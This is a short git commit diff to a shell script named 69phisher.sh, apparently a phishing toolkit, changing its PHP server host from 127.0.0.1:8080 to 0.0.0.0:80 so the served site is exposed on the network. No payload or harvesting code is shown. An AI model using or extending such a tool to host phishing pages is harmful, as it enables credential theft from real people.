863cdda49a682d5ec3352d319ece8eb75673f7f1
Dr. Muhammad Sayyed Khalil <118336844+kholi0o@users.noreply.github.com>
2025-05-04 22:30:22 +0300

    Update 69phisher.sh

--- 69phisher.sh
+++ 69phisher.sh
@@ -221,8 +221,8 @@ about() {
 }
 
 ## Setup website and start php server
-HOST='127.0.0.1'
-PORT='8080'
+HOST='0.0.0.0'
+PORT='80'
 
 setup_site() {
 	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Setting up server..."${WHITE}
